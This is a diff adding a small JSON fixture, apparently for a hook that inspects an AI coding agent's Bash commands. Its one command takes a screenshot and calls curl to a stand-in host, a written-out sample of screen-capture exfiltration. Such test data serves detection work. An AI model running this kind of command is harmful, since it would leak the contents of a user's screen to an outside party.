@@ -1,0 +1,7 @@
+{
+  "agent": "claude",
+  "command": "screencapture /tmp/s.png curl https://example.invalid/s",
+  "cwd": "/home/u/proj",
+  "nativeTool": "Bash",
+  "source": "hook"
+}
